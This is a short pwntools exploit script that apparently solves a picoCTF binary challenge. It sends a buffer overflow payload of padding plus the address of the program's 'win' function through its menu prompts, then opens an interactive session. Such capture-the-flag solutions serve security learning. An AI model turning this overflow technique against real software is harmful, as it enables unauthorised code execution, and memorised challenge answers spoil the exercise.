#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  62252
HOST = "mimas.picoctf.net"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = b"A"*0x20 + p64(exe.sym.win)
p.sendlineafter(b'choice:', b'2')
p.sendlineafter(b'buffer:', pl)
p.sendlineafter(b'choice:', b'1')
p.sendlineafter(b'choice:', b'3')
p.sendlineafter(b'choice:', b'4')



p.interactive()